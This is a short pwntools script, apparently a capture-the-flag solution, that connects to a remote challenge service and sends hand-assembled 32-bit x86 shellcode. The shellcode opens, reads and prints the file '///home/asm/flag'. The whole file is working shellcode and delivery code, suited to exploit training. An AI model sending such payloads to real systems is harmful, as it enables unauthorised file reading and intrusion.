from pwn import *

#context.log_level = "debug"

r = remote("kuics.us.to", 20004)

shellcode = ""
shellcode += asm("xor eax, eax")
shellcode += asm("push eax")
shellcode += asm("push 0x67616c66")
shellcode += asm("push 0x2f6d7361")
shellcode += asm("push 0x2f656d6f")
shellcode += asm("push 0x682f2f2f")
shellcode += asm("mov ecx, eax")
shellcode += asm("mov ebx, esp")
shellcode += asm("mov al, 0x5")
shellcode += asm("int 0x80")
shellcode += asm("xor edx, edx")
shellcode += asm("mov dl, 0x50")
shellcode += asm("sub esp, 0x50")
shellcode += asm("mov ecx, esp")
shellcode += asm("mov edi, ecx")
shellcode += asm("mov ebx, eax")
shellcode += asm("xor eax, eax")
shellcode += asm("mov al, 0x3")
shellcode += asm("int 0x80")
shellcode += asm("mov ecx, edi")
shellcode += asm("xor ebx, ebx")
shellcode += asm("xor eax, eax")
shellcode += asm("mov bl, 0x1")
shellcode += asm("mov al, 0x4")
shellcode += asm("int 0x80")

print r.recvuntil("shellcode: ")
r.send(shellcode)
print r.recv(1024)
